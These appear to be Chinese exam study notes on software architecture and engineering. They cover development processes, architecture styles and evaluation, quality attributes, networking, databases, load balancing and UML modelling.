RUP（统一软件开发过程）阶段任务（P101） 初始：定义最终产品视图和业务模型，并确定系统范围。 细化：设计及确定系统的体系结构，指定工作计划及资源要求。 构造：构造产品并继续演进需求、体系结构，计划直至产品移交。 移交：把产品提交给用户使用。 每个阶段都由一个或多个迭代组成，迭代并非重复地做相同的事，而是针对不同用例的细化和实现。每一个迭代都是一个完整的开发过程（螺旋模型）。 项目管理工具（P108） 项目管理工具（如成本估算工具）用来辅助软件的项目管理活动。它通常把重点放在一个或某几个特定的管理环节上，而不提供对管理活动包罗万象的支持。 需求管理（P109） 需求管理是一个对系统需求变更、了解和控制的过程。 原则（策略）： 需求管理的关键领域不涉及收集和分析项目需求 开发人员在向客户以及有关部门承诺某些需求之前，应该确认需求和约束条件、风险、偶然因素、假定条件等。绝不承诺任务无法实现之事。 关键处理领域同样建议通过版本控制和变更控制来管理需求文档。 需求变更策略（P112） 所有需求变更必须遵循变更控制过程。 对于未获批准的变更，不应该做设计和实现工作。 变更应该由项目变更控制委员会决定实现哪些变更。 项目风险承担者应该能够了解变更数据库的内容。 决不能从数据库中删除或修改变更请求的原始文档。 每一个集成的需求变更必须能够跟踪到一个经核准的变更请求。 项目范围定义（P116） 项目章程、项目范围管理计划、组织过程资产、批准的变更申请 项目时间管理（P116） 项目时间管理的过程包括：活动定义、活动排序、活动的资源估算、活动的历时估算、制定进度计划、进度控制。 为了得到工作分解结构（WBS）中最底层的交付物，必须执行一系列的活动，对这些活动的识别以及归档的过程就叫做活动定义。 产品配置的配置项（P117） 属于产品组成部分的工作成果：需求文档、设计文档、源代码、测试用例等。 属于项目管理和机构支撑过程域产生的文档：工作计划、项目质量报告、项目跟踪报告等。 程序静态分析 在不执行程序的情况下，对其进行分析的技术。 其特点为：不实际执行程序，分析速度快、效率高，误报率较高。 相较之下的动态分析则需实际执行程序，多用于性能测试、功能测试、内存测试等。 静态分析技术 词法分析：逐字符读入源程序，使用正则匹配转换为等价符号流，生成相关符号列表。 语法分析：判断源程序结构上是否正确，通过上下文无关语法将相关符号整理为语法树。 抽象语法树分析：将程序组织成树形结构，树中相关节点代表程序中的相关代码。 语义分析：对结构上正确的源程序进行上下文有关的性质检查。 控制流分析：生成有向控制流图，用节点代表基本代码块，节点间的有向边代表控制流路径，反向边表示可能存在的循环，还可生成函数调用关系图，表示函数间的嵌套关系。 数据流分析：对控制流图遍历，记录变量的初始化点和引用点，保存切片相关数据信息。 污点分析：基于数据流图判断代码中哪些变量可能受到攻击，是验证输入、识别代码表达缺陷的关键。 无效代码分析：根据控制流图可分析孤立节点就是无效代码。 遗留系统的演化策略 淘汰、改造、继承、集成 逆向工程导出信息级别（P123） 实现级：包括程序的抽象语法树、符号表等信息 结构级：包括反映程序分量之间相互依赖关系的信息，如调用图、结构图。 功能级：包括反映程序段功能及程序段之间关系的信息。 领域级：包括反映程序分量或程序诸实体与应用领域概念之间对应关系的信息。 软件架构设计的生命周期（P125） 需求分析阶段：关注问题域 软件设计阶段：将需求转换为软件架构模型 软件实现阶段：关注将架构设计转换为实际代码 软件部署阶段：通过组装软件组件提高系统的实现效率 其中在设计和实现阶段对软件架构的关注度最大，软件系统架构必须建立在需求明确的基础上。 架构模式、设计模式、惯用法的区别 架构模式是软件设计中的高层决策，反映了开发软件系统过程中所作的基本设计决策。 设计模式主要关注软件系统的设计，与具体的实现语言无关。 惯用法是实现时通过某种特定的程序设计语言来描述构件与构件之间的关系。 软件架构的主要作用（P127） 分析设计在满足规定需求方面的有效性。 在设计变更相对容易的阶段，考虑体系结构可能选择的方案。 降低与软件构造相关联的风险。 软件架构策略 关键 问题 危害 策略 要点 是否遗留了至关重要的非功能需求 对需求理解不系统、不全面，对非功能需求不够重视 造成返工、项目失败 全面认识需求 从不同级别、不同类别梳理列表，归纳总结，建立跟踪矩阵 能否驯服数量巨大且频繁变化的需求 对于时间和质量的矛盾，办理不足，处理草率 耗时不少、质量不高 让关键需求决定架构：只分析和重点关注关键功能性需求和重要的质量属性需求 控制架构设计时需详细分析用例的个数，权衡非功能需求之间的关系，找到影响架构的重点非功能需求 能否从容地设计软件架构的不同方面 架构设计方案覆盖范围严重不足，许多关键决定被延迟由实现人员仓促决定 开发混乱、质量不高 多立场、多视角探寻架构：架构级设计是分层式的分而治之，子系统是功能性分而治之 一次只从某一主场、某一视角出发，围绕少数概念和技术展开，并分析对其他部分、其他立场视角分析结果的关系与影响 是否及早验证架构方案并作出调整 假设架构方案是可行的，直到后期才能发现问题，造成大规模返工 造成返工、项目失败 尽早验证架构：采用原型技术和框架技术 必须精挑细选能够触发主要设计决策参与执行的、或有较高技术风险的、或最影响用户满意度的一切功能进行验证 全面认识需求 功能需求 质量属性 约束 组织级 软件系统实现的功能 - 成本、上线时间、业务限制 用户级 软件系统实现的功能 易用性、性能、持续可用性、可靠性 用户的计算机水平有限 开发级 软件系统实现的功能 可扩展性、可重用性、可移植性、易理解性、易测试性 开发语言的约束 体系结构失配（P128） 由构件引起的失配：包括系统对构件基础设施、构件控制模型和构件数据模型的假设存在冲突。 由连接子引起的失配：包括系统对构件交互协议、连接子数据模型的假设存在冲突。 由于系统成分对全局体系结构的假设存在冲突引起的失配。 软件架构的重要性（P130） 能满足系统的品质 使受益人达成一致的目标 能够支持计划编制过程 对系统开发的指导性 能够有效管理复杂性 为复用奠定了基础 能够降低维护费用 能够支持冲突分析 DSSA特定领域架构的角色与任务（P145） 角色 任务 领域专家（软件工程师） 提供关于领域中系统的需求规约和实现的知识，帮助组织规范的、一致的领域字典，帮助选择样本系统作为领域工程的依据，复审领域模型、DSSA等领域工程产品等 领域分析者（系统分析员） 控制整个领域分析过程，进行知识的获取、将获取的知识组织到领域模型中，根据现有系统、标准规范等验证领域模型的准确性和一致性，维护领域模型 领域设计者（软件设计人员） 控制整个软件设计过程，根据领域模型和现有的系统开发出DSSA，对DSSA的准确性和一致性进行验证，建立领域模型和DSSA之间的关系 领域实现者（程序设计人员） 根据领域模型和DSSA，或者重头开发可重用构件、或者利用再工程的技术从现有系统中提取可重用构件，对可重用构件进行验证，建立DSSA与可重用构件之间的联系 ATAM体系架构权衡分析方法（P152） 主要关注系统的 [需求建模] ， 并在系统开发之前，针对 [性能、实用性、安全性和可修改性] 等质量属性进行评价和折中。 ATAM不是精确的评估工具，其整个评估过程强调以 [质量属性] 作为架构评估的核心概念。 在识别出质量属性的描述后，通常采用 [决策表] 对质量属性的描述进行刻画与排序。 ATAM分为4个主要的 [活动领域] ，包括需求收集、体系结构视图描述、属性模型构造和分析、折中。 软件设计阶段的度量 架构层次度量：考虑了设计模型的体系结构方面 构件层次度量：通过建立内聚、耦合和复杂度的简介度量，提供了模块质量的指示 界面层次度量：给GUI的布局提供了恰当性的提示 耦合程度 从低到高排列如下（越低越好）： 非直接耦合：两个模块间无直接联系，他们之间的联系完全是通过主模块的控制和调度实现的。 数据耦合：一个模块访问另一个模块时，彼此之间是通过简单数据参数来交换输入输出信息的。 标记耦合：一组模块通过参数表传递记录信息。这个记录是某一数据结构，而非简单变量。 控制耦合：一个模块通过传送开关、标识等控制信息，明显选择另一模块的内部功能。 外部耦合：一组模块通过访问同一全局简单变量（而非参数表或全局数据结构）来传递信息。 公共耦合：一组模块通过访问同一公共环境数据（而非全局简单变量）来传递信息。 内容耦合：一个模块直接修改或操作另一模块的数据，或者不通过正常入口转入另一模块。 文档评审 需求评审：进一步确认开发者和设计者已了解的用户要求、以及用户从开发者了解的某些限制和约束 设计评审：产生的最终文档规定系统和程序如何设计开发和测试，以满足统一的需求规格说明书 概要设计评审：评审每个系统组成部分的基本设计方法和集成测试计划，并相应修改系统规格说明书 详细设计评审：主要评审计算机程序、程序单元测试计划 形式化方法 数据不变式：即一个条件表达式，它在包含一组数据的系统的执行过程中总保持为真。 状态：即从系统外部能够观察到的行为模式的一种表示（或者系统访问和修改的存储数据） 操作：即系统中发生的动作，以及对状态数据的读写。每一个操作均与前置条件和后置条件相关。 用例图-用例间关系（P159） 泛化： 包含：特殊的依赖关系，一个用例（称作基本用例）包含了另一个用例（称作包含用例）的行为。 扩展：类似于泛化关系，但有更多规则限制。扩展用例只能在基本用例的扩展点上增加新的行为。 UML面向对象设计（P176） 边界类：实现界面控制、外部接口和环境隔离。 实体类：表示目标软件系统中具有持久意义的信息项及其操作。 控制类：作为完成用例任务的责任承担者，协调、控制其他类共同完成用例规定的功能或行为。 软件构件概念（P247） 软件构件是软件系统中具有一定意义的、相对独立的可重用单元。构件可以基于对象实现、也可以不基于对象实现。构件需要在容器中管理并获取容器提供的服务。客户程序可以在运行状态下利用接口动态确定构件所支持的功能并调用。 构件设计原则 开关原则：模块应对外延具有开放性，对修改具有封闭性 Liskov替换原则：子类可以替换它们的基类 依赖倒置原则：依赖于抽象，而非具体实现 接口分离原则：多个用户专用接口比一个通用接口要好 构件依赖关系 共享依赖：使用相同资源的 [消费者间] 或 [生产者间] 的依赖 流依赖： [生产者和消费者间] 的资源依赖 约束依赖：一组 [活动间] 的相关控制流上的约束 基于构件开发模型的顺序执行阶段 需求分析定义、体系结构设计、构件库建立、应用软件创建、测试和发布 基于构件的软件工程的复用性计划 成品构件：从第三方获得，或在以前项目中已进行内部开发的既有软件。成品构件能够直接应用于当前项目。 具有完全经验的构件：以前项目开发的构件，与当前项目需要构造的软件具有一定相似性。对其修改的风险较小，要求团队成员在这些构件所代表的领域中具有丰富的经验。 具有部分经验的构件：以前项目开发的构件，与当前项目需要构造的软件具有一定相似性。由于团队成员在这些构件所代表的领域中的经验较少，若对其做实质性的修改，会有较大风险。 新构件：软件团队为了满足当前项目的特定需求，而必须专门开发的软件构件。 加密解密技术（P307） 对称算法：DES（便于硬件不便于软件实现），RC-5，IDEA 非对称算法：RSA，ECC 摘要算法（不可逆）：MD5，MD4，SHA，HMAC 网络七层协议（P317） 网络层 相关协议 应用层 DHCP、DNS、FTP、Gopher、HTTP、HTTPS、IMAP4、IRC、NNTP、XMPP、POP3、SIP、SMTP、SNMP、SSH、TELNET、RPC、RTCP、RTP、RTSP、SDP、SOAP、GTP、STUN、NTP、SSDP、NFS（网络文件系统） 表示层 HTTP/HTML、FTP、Telnet、ASN.1（具有表示层功能） 会话层 ADSP、ASP、H.245、ISO-SP、iSNS、NetBIOS、RPC、RTCP、SMPP、SCP、SSH、ZIP、SDP（具有会话层功能） 传输层 TCP、UDP、TLS、DCCP、SCTP、RSVP、PPTP 网络层 IP (IPv4、IPv6)、ICMP、ICMPv6、IGMP、IS-IS、IPsec、BGP、RIP、OSPF、ARP、RARP 数据链路层 L2TP（第2层隧道协议）、PAP（密码认证协议）、Wi-Fi(IEEE 802.11)、WiMAX(IEEE 802.16)、ATM、DTM、令牌环、以太网路、FDDI、帧中继、GPRS、EVDO、HSPA、HDLC、PPP、ISDN、STP 物理层 RS-232、RS-449、X.21、V.35、ISDN、FDDI、IEEE802.3、IEEE802.4、IEEE802.5、以太网路卡、调制解调器、电力线通信(PLC)、SONET/SDH（光同步数字传输网）、G.709（光传输网络）、光导纤维、同轴电缆、双绞线 Internet三种服务质量类型 保证质量的服务：对带宽、时延、抖动和丢包率提供定量的保证。 尽力而为的服务：这是一般的Internet服务，不保证服务质量 负载受控的服务：提供类似于网络欠载时的服务，定性地提供 网络分层设计模型（三层模型） 核心层（网络的高速交换主干）　　是所有流量的最终承受者和汇聚者，其主要功能是实现骨干网络间的优化传输，因此应采用冗余设计，以保证冗余能力、可靠性和高速传输。 汇聚层（提供基于策略的连接）　　是核心层与接入层的中介，即在工作站接入前先做好汇聚，以减轻核心层的设备负荷。如过滤数据包、策略路由、完成路由汇总和协议转换功能等。 接入层（将工作站接入网络）　　应提供即插即用特性，为用户提供本地网段访问接入能力，主要解决相邻用户互访需求，并应适当负责一些用户管理工作（如地址认证、用户认证、计费管理等），以及用户信息的收集工作（如IP地址、MAC地址、访问日志等）。 网络开发过程 需求分析：理解网络应该具有的功能和性能，最终设计出符合用户需求的网络 网络体系分析：分析现有网络和新网络的各类资源分布，掌握网络所处的状态 网络逻辑设计：根据需求规范和通信规范，实施资源分配和安全规划 物理网络设计：依据逻辑网络设计的功能要求，确定设备的具体物理分布和运行环境 网络存储方式 DAS：开放系统的直连式存储　　在服务器上外挂了一组大容量硬盘，存储设备与服务器之间采用SCSI通道连接。　　这种方式难以扩展存储容量，且不支持数据容错功能，当服务器出现异常时会造成数据丢失。 NAS：网络接入存储（公网环境）　　是将存储设备连接到现有的网络上，提供数据存储和文件访问服务的设备。　　NAS服务器是在专用主机上安装简化了的瘦操作系统的文件服务器，它内置了与网络连接所需要的协议，可以直接联网，具有权限的用户都可以通过网络访问NAS服务器上的文件。 SAN：存储区域网络（专网环境）　　是一种连接存储设备和存储管理子系统的专用网络，专门提供数据存储和管理功能。　　SAN可以看做是负责数据传输的后端网络，而前端网络（又称数据网络）则负责正常的TCP/IP传输。　　SAN也可以看做是通过特定的互连方式连接的若干台存储服务器组成的单独的数据网络，提供企业级的数据存储服务。 SNMP.v3（简单网络管理协议） 必须防护的威胁： （主要）修改信息 （主要）假冒 （次要）修改报文流 （次要）消息泄露 不必防护的威胁： 拒绝服务 通信分析 网络架构数据流图的内容 服务器及其物理位置、客户端及其物理位置、处理器说明、传输协议 HTTP超文本传输协议 HTTP是一种基于TCP 80端口在浏览器和web服务器之间传送网页信息的应用层协议。 TCP是一种面向连接的传输层协议，在数据传输之前需要在发送方和接收方之间建立一对一的连接（单播通信），因此HTTP使用TCP传送页面文件时，每个页面文件都需要单独建立一条TCP连接。 RIP路由协议 一种内部网关协议，采用距离向量算法，使用“跳数”来衡量到达目标的路由距离。 这种协议的路由只关心自己周围的世界，只与自己相邻的路由交换信息，范围限制在15跳以内，再远则不关心了（认为不可达）。 默认情况下，RIP使用一种非常简单的度量机制：距离就是通往目的站点所经的链路数，取值为1~15，数值16表示无穷大（不可达）。 系统可维护性评价指标（P397） 可理解性、可测试性、可修改性 系统维护工作类型（P397） 更正性维护：针对系统内隐藏的错误 适应性维护：为了适应软硬件环境变化 完善性维护：针对用户的功能扩充需求 预防性维护：针对可能会发生的变化或调整先行维护 计算机质量保证计划规范内容 验证：确定软件在开发周期中的一个给定阶段的产品是否达到上一阶段确立的需求的过程 确认：在软件开发过程结束时对软件进行评价，以确定它是否和软件需求相一致的过程 测试：通过执行程序来有意识地发现程序中的设计错误和编码错误的过程。 测试是验证和确认的手段之一。 集成平台的基本功能（P449） 通信服务　　提供透明的同步/异步通信服务功能（用户和应用无需关心具体的操作系统和网络物理位置）。 信息集成服务　　实现不同数据库系统间的数据交换、互操作、分布数据管理和共享信息模型定义，使继集成平台运行的应用、服务或用户端能够以一致的语义和接口实现对数据的访问与控制。 应用集成服务　　能够为应用提供数据交换和访问操作，使各种不同的系统能够相互协作。 二次开发工具 平台运行管理工具 企业集成模式（P451） 面向信息的集成　　强调实现数据的转换（不同数据格式和存储方式之间的转换）、数据源的统一（同一个数据仅有一个数据入口）、数据的一致性维护、异构环境下不同的应用系统之间的数据传送。 面向过程的集成　　采用工作流管理方式，强调处理不同应用系统之间的交互逻辑，与核心业务逻辑相分离，并通过不同应用系统之间的协作共同完成某项业务功能。 面向服务的集成　　强调大范围内的公共业务过程集成的动态继承方式，可以较好实现企业间具有松散耦合关系的不同应用之间的互操作。 企业应用集成 数据集成：提供企业之间的信息共享能力 API集成： 功能集成：通过重用现有逻辑来实现和提供更强大的功能 界面集成：使得用户对集成系统产生一个“整体”的感觉 EDI电子数据交换（P462） 电子数据交换是电子商务活动中采用的一种重要技术手段。 EDI的实施需要一个公认的标准和协议，将商务活动中涉及的文件标准化和格式化。 EDI通过计算机网络，在贸易伙伴之间进行数据交换和自动处理。 EDI主要应用于企业与企业、企业与批发商之间的批发业务。 EDI的实施在技术上比较成熟，但是实施EDI需要统一数据格式，成本与代价较大。 嵌入式系统软硬件协同设计过程（P510） 目标系统构思 系统需求描述 模块的行为描述 对模块的有效性检查 软硬件划分 性能评估 硬件综合、接口综合和软件编译 软硬件集成 软硬件协同仿真、系统评估与设计验证 下午题 Mysql主从复制优点 主从复制机制使得同样的数据可存在多个副本，这样用户在查询数据时，可以选择该数据最近的副本访问，从而提高访问效率、降低资源使用时的冲突。 Memcached缓存与数据库缓存差异 缓存架构：数据库仅缓存查询结果，适用面窄；Memcached则将数据库中的表进行缓存，对这些表的操作均可适用。 缓存有效性：数据库查询缓存时效较短（与配置有关）；Memcached缓存时效较长，只要未更新就属于有效状态。 缓存数据类型：数据库查询缓存为元组级；Memcached缓存数据为表级。 数据库系统提供的基本加解密方式 加解密API　　DBMS提供可在SQL中调用的加解密API，应用程序据此构建自己的基础架构，对数据进行加密保护。 加解密API的灵活性强，但构建和管理复杂。 透明加密　　安全管理员为数据库敏感字段选择加密方式及密钥强度，应用程序访问受保护数据时，只需使用口令打开或关闭密钥表，对数据的加密和解密由DBMS自动完成。　　透明加密方式管理简单，应用程序负担轻，但灵活性差。 反规范化技术 规范化设计后，数据库设计者希望牺牲部分规范化来提高性能，这种从规范化设计回退的方法称为反规范化技术。 优点：降低连接操作的需求、减少外码和索引的数目、还可能减少表的数目，能够提高查询效率。 缺点：数据重复存储，浪费硬盘空间；可能出现数据完整性问题；为了保障数据一致性，增加了数据维护的复杂性，降低修改速度。 反规范化技术主要有： 增加冗余列：在多个表中保留相同列，减少或避免查询时的连接操作。 增加派生列：增加由本表或其他表中数据计算生成的列，避免计算或使用集合函数。 重新组表：若许多用户要查看两个表连接得到的结果数据，则把两个表重组为一个表提高性能。 水平分割表：按行切割数据到多个独立表，多用于数据规模很大、或需要存放到多个介质的情况。 垂直分割表：按列分割，将主键与部分列放到一个表，主键与其他列放到另一个表，减少查询时的IO次数。 数据库分区 水平分区　　对表的行进行划分，使得所有在表中定义的物理列，在每一个分区表中都能得以保留，从而使得表的特性能够得以保持。 垂直分区　　对表的列进行划分，以减少表的宽度，使得某些特定列被划分到特定分区。（如把某些不常访问的超长列划分出去，则可以在保证数据相关性的同时提高访问速度）。 NoSQL的优缺点 优点： 支持高并发数据访问，性能较高。 数据存储结构松散，能够灵活支持多种类型的数据格式。 能够支持海量数据的存储，且易于横向扩展。 基于分布式数据存储，不存在单点故障和性能瓶颈，系统可用性高。 缺点： 现有产品不够成熟，大多数产品处于初创期。 并未形成一定的标准，产品种类繁多，缺乏官方支持。 不提供对SQL的支持，学习和应用迁移成本较高。 支持的特性不够丰富，现有产品提供的功能比较有限。 负载均衡技术（P40） DNS 负载均衡技术　　在DNS中为多个IP地址配置同一个名字，因而查询这个名字的客户端只能得到其中一个地址，使得不同的客户端访问不同的服务器。（最早的技术，简单有效，但不能区分服务器差异） 代理服务器/反向代理 负载均衡技术　　以代理服务器接受网络客户端的请求，并将这些请求动态、均匀地转发到内部网络的多台服务器，最后把请求结果返回给对应的客户端。（能实时考虑服务器的性能和负载，可缓存静态资源并提升访问速度，此时代理服务器对外表现为一个服务器） NAT（网络地址转换） 负载均衡技术　　将一个外部IP地址（即对内网而言的网关）映射为多个内部IP地址，对每一次TCP连接请求，均动态地使用其中一个内部地址，以达到负载均衡。（可屏蔽内网结构，缓解Internet地址紧张问题） 协议内部支持 负载均衡技术　　由通信协议自身算法实现的负载均衡技术，如HTTP协议中的重定向能力。 混合型 负载均衡技术　　由于多个服务器群内的软硬件设备、规模、提供服务等存在差异，可以考虑给每个服务器群采用最合适的负载均衡方式，然后又在这多个服务器群间再一次负载均衡（或集群起来），以一个整体对外提供服务，从而达到最佳性能。（有时也用于单台负载均衡设备，其性能不能满足大量请求的情况下） ABSD（基于体系结构的软件架构设计）概念（P131） ABSD强调由商业、质量和功能需求的组合驱动软件架构设计。 使用ABSD方法，设计活动可以从项目总体功能框架明确就开始，并且设计活动的开始并不意味着需求抽取和分析活动可以终止，而是应该与设计活动并行。 ABSD方法是一个自顶向下、递归细化的过程。软件系统的架构通过该方法得到细化，直到能够产生软件构件的类。 ABSD方法的三个基础（P131） 对系统功能进行分解： 基于模块的内聚和耦合技术 选择体系结构风格： 实现质量和商业需求 软件模板的使用： 设计软件结构 ABSD的6个主要活动/子过程（P133） 需求：用户对目标软件系统在功能、行为、性能、设计约束等方面的期望。 设计：通过需求来激发和调整设计决策（设计是迭代的过程） 文档化：文档是系统设计与开发人员的通信媒介、是验证体系结构时，执行预先分析的基础 复审：标识潜在的风险，及早发现体系结构设计中的缺陷和错误。 实现：用实体来显示出一个软件体系结构 演化：使用系统演化步骤去修改应用，以满足新的需求。 ABSD需求过程（P133） 需求获取 标识构件：生成类图、对类进行分组、把类打包成构件 需求评审 ABSD设计过程（P134） 提出体系结构模型 映射构件 分析构件相互作用 产生体系结构 设计评审 ABSD文档化（P135） 体系结构文档化过程的主要输出结果是 [体系结构规格说明] 和 测试体系结构需求的 [质量设计说明书] 。 文档要从 [使用者] 的角度进行编写，必须分发给 [所有与系统相关的开发人员]，且必须保证 [开发者] 手上的文档是最新的。文档中的描述应该尽量避免不必要的重复，每次文档的修改都应该进行记录。 ABSD复审（P135） 架构设计、文档化和复审是一个迭代过程。 在一个主版本的软件架构分析后，要安排一次由 [外部人员（用户代表或领域专家）] 参加的复审。 由用户代表和领域专家决定架构是否满足需求、质量需求是否在设计中得到体现。 复审过程中，通常会对一个可运行的最小化系统进行架构评估和测试。 复审的目标是标识潜在的风险，及早发现架构设计的缺陷和错误。 ABSD实现过程（P135） 分析与设计、构件实现、构件组装、系统测试 ABSD演化过程（P136） 需求变化归类 体系结构演化计划 构件变动（可利用构件库） 更新构件的相互作用 构件组装与测试 技术评审（若不能反映需求变动或不符合用户要求，需回到第2步迭代） 得到演化后的体系结构 系统架构风格（P137） 软件架构风格是描述某一特定领域中系统组织方式的惯用模式，它定义了一类架构所共有的特征，主要包括架构定义、架构词汇表和架构约束。 其中组织方式描述了系统的组成构件及其组织方式，惯用模式则反映了众多系统共有的结构和语义。 架构风格 子分类 说明 数据流风格 批处理序列 组件为一系列固定顺序的独立计算单元，组件间只通过数据传递交互，传递的数据必须是完整的   管道-过滤器 每个构件（过滤器）都有一组输入和输出，数据输入构件，经过内部处理，然后产生数据输出。这种风格的连接件就像是数据流传输的管道，将一个过滤器的输出传到另一个过滤器的输入 调用/返回 主程序-子程序 所有的计算构件作为子程序协作工作，并由一个主程序顺序地调用这些子程序，构件通过共享存储区交换数据   面向对象风格（数据抽象和面向对象组织） 将数据表示和基本操作封装在对象（构件）中，对象维护自身表示的完整性，对象间通过消息机制进行通信，对象交互时需要知道彼此的标识，通过对象间的协作完成计算过程   分层系统（层次结构） 每一层的构件为上层服务，并作为下层客户。此风格支持增加抽象层的设计，允许将一个复杂问题分解成一系列增量步骤的实现，由连接件控制层间构件的拓扑约束，系统结构更清晰 独立构件风格 进程通讯     事件驱动系统（隐式调用） 构件不直接调用一个过程，而是触发或广播一个或多个事件。系统中其他构件的过程在一个或多个事件中注册，因而当一个事件触发就会导致另一模块中的过程调用。基于事件驱动模式的系统具有某种意义上的递归性，形成了“部分-整体”的层次结构。 C2风格（虚拟机） 解释器 通常包括[正在被解释执行的伪码]和[解释引擎]。伪码由[需要被解释执行的源码]和[解释引擎分析所得的中间代码]组成；解释引擎包括[语法解释器]和[解释器当前的运行状态]。（典型如JVM：通过虚拟架构屏蔽不同的硬件环境）   基于规则的系统 通过连接件绑定在一起，按照一组规则运作的并行构件网络 仓库风格（仓库系统及知识库） 数据库系统 独立构件在中央数据存储区上执行，由构件控制共享数据。（系统由输入数据流中的事务信息来驱动）   超文本系统     黑板系统 系统根据中央数据单元的各种状态启动各种进程，以响应知识库的变化 复制风格 复制仓库     缓存系统   其他风格 CS（二层）结构 系统中的功能构件被充分隔离，客户端应用程序的开发集中于数据的显示和分析，而数据库服务器的开发则集中于数据的管理   CS三层结构 增加了应用服务器，可以将整个应用逻辑驻留在应用服务器上，而只有表示层存在于客户机上。三层CS把应用功能分成表示层、功能层和数据层   BS风格 是三层CS结构的另一种实现方式，其具体结构为 浏览器/WEB服务器/数据库   CS与BS混合软件体系结构 如内部采用CS风格，对外采用BS风格   面向Agent软件体系结构     Process Control（Loop）     Heterogenous Architecture（异构）     控制环路风格 将过程输出的指定属性维护在一个特定的参考值（设定点）该风格包括过程变量、被控变量、输入变量、操纵变量和设定点等构件，通过收集实际和理想的过程状态信息，调整过程变量使得实际状态趋于理想状态   闭环结构风格 通常由几个协作构件共同构成，且其中主要的构件彼此独立，能够单独进行替换和重用。但闭环结构通常只适用于处理简单任务（如机器装配等） 系统质量属性（P147） 质量属性 子属性 说明 架构策略 性能   单位时间内所处理事务的数量 或 系统完成某个事务处理所需的时间 资源需求：减少计算开销、控制采样频率、限制执行时间、限制队列大小资源管理：引入并发、维持数据或计算的多个副本、增加可用资源资源仲裁：先进先出、固定优先级调度、动态优先级调度 可靠性   在意外或错误使用的情况下维持软件系统的功能特性的基本能力 用平均失效等待时间（MTTF）和平均失效间隔时间（MTBF）衡量   容错性 在错误发生时确保系统正确的行为，并进行内部修复     健壮性 保护应用程序不受错误使用和错误输入的影响，遇到意外错误事件时确保应用系统处于已定义的状态 可用性   两次故障之间的时间长度 或 出现故障时系统能够恢复正常的速度 错误检测：命令/响应、心跳、异常错误恢复：表决、主动冗余、被动冗余、备件、Shadow操作、状态再同步、检查点/回滚错误预防：事务、进程监视器 安全性   系统在向合法用户提供服务的同时能够阻止非授权用户使用的企图或拒绝服务的能力 抵抗攻击：身份验证、用户授权、维护数据机密性、维护数据完整性、限制暴露信息、限制访问检测攻击：入侵检测从攻击中恢复：恢复状态、识别攻击者   机密性 保证信息不泄露给未授权的用户、实体或过程     完整性 保证信息的完整和准确，防止被非法修改     不可否认性       可控性 保证对信息的传播及内容具有控制的能力，防止为非法者所用   可修改性   能够快速地以较高的性价比对系统进行变更的能力 局部化修改：减少由某个变更直接影响的数量防止连锁反应：限制对局部化的模块的修改延迟绑定时间：控制部署时间和成本   可维护性 体现在对问题的修复     可扩展性 使用新特性扩展软件系统     结构重组 重新组织软件系统的构件及构件间的关系     可移植性 使软件适用于多种硬件平台、用户界面、操作系统、编程语言或编译器   功能性   系统完成所期望的工作的能力   可变性   经扩充或变更而成为新体系结构的能力   互操作性   与其他系统或自身环境相互作用的能力   可测试性 易安装性易替换性适应性 在完成一个软件的增量开发后，能轻松地对其进行测试的能力 输入/输出：记录回放、将接口与实现分离、特化访问路线/接口内部监视：内置监视器 易用性 易理解性易操作性易学性 衡量用户使用一个软件产品完成指定任务的难易程度 运行时战术：维持任务的一个模型、维持用户的一个模型、维持系统的一个模型设计时战术：将用户接口与应用的其余部分分离开来 系统架构评估（P149） 系统架构风险（风险点/非风险）：指在架构设计中潜在的、存在问题的架构决策所带来的隐患。 敏感点：为了实现某种特定的质量属性，一个或多个构件所具有的特性。 权衡点：是影响多个质量属性的特性，是多个质量属性的敏感点。 UML的10种4类模型视图（P158） 机制 分类 子分类1 子分类2 说明 静态建模机制 用例图     从用户角度描述系统功能，并指出各功能的操作者   静态图 类图   描述类的静态结构（属性、操作）和类间关系（关联、依赖、聚合）     对象图   类图的实例，几乎与类图标识一样，但存在生命周期     包图（软件体系结构图）   由包与类组成，标识包与包的关系，描述系统的分层结构   实现图 构件图   描述代码部件的物理结构及各部件间的依赖关系，以分析和理解部件间的相互影响程度     配置图（部署图/实施图）   定义系统中软硬件的物理体系结构 动态建模机制 行为图 状态图（行为模型）   描述类的对象所有可能的状态，及事件发生时的状态转移条件     活动图   特殊的状态图，强调对象内的控制流程，描述流程化处理     交互图（用例实现图） 顺序图（时序图） 描述一组对象及其收发的消息，反映对象间的交互关系，强调按时间顺序对控制流建模       协作图（合作图） 描述一组对象间的连接及其收发的消息，反映对象间的协作关系，强调按组织结构对控制流建模 数据流图 数据流图（DFD）是以图形方式描述数据在系统中流动和处理的过程，由于它只反映系统必须完成的功能，因此它是一种功能模型，其包含4种基本元素： “→”箭头表示数据流，是数据在系统内传播的路径，由一组成分固定的数据组成。 “o”圆或椭圆表示加工，是对数据进行处理的单元，它接收一定的数据输入，处理后产生输出。 “=”双杠表示数据存储，即信息的静态存储，可以是文件、文件的一部分、数据库的元素等。 “□”矩形表示外部实体，是数据的源点或终点，可以是人、物或其他软件系统。 数据流图的常见错误类型 黑洞：加工仅有输入流，缺少输出流。 奇迹：加工仅有输出流，缺少输入流。 重名：多条数据流经过加工后，命名不变。 错误：数据流的源点或终点错误，如：　　外部实体没有经过加工处理，直接到数据存储。　　外部实体之间没有加工处理，存在直接数据流。 数据流图、流程图的含义与区别 含义：　　数据流图是用来说明业务处理过程、系统边界所包含的功能和系统中的数据流。　　流程图展示应用程序从数据输入开始到获得输出为止的逻辑过程，描述的是处理过程的控制流。 区别： 数据流图中的处理过程可并行；流程图在某个时间点只能处于一个处理过程。 数据流图展现系统的数据流；流程图展现系统的控制流。 数据流图展现全局的处理过程，过程之间遵循不同的计时标准；流程图中处理过程遵循一致的计时标准。 数据流图适用于系统分析中的逻辑建模阶段；流程图适用于系统设计中的物理建模阶段。 数据流图设计原则 复杂性最小化：DFD分层结构就是把信息划分为小的且相对独立的一大批子集，以便于单独考查每一个DFD，如果要了解某个过程更详细的信息，可以跳转到上一层的DFD再考查。 接口最小化：在设计模型时，应使得模型中各个元素之间的接口数或连接数最小化。 数据流一致性：一个过程和它的分解在数据流内容中应保持一致，数据流不应该存在“黑洞”，也不应该存在“奇迹”。 CRUD矩阵 指利用矩阵的形式来表示各个不同用户对不同操作的动作行为。其中，C（Create）→产生，R（Read）→引用，U（Update）→更新，D（Delete）→删除。 [success] 小诀窍：只要用户与操作之间存在关系，则至少必存在R关系。 4+1视图（P181 - 图P103） 逻辑视图：设计的对象模型，说明系统应为用户提供哪些服务 过程视图：捕捉设计的并发和同步特征 物理视图：描述了软件到硬件的映射，反映了分布式特性 开发视图：描述了在开发环境中软件的静态组织结构 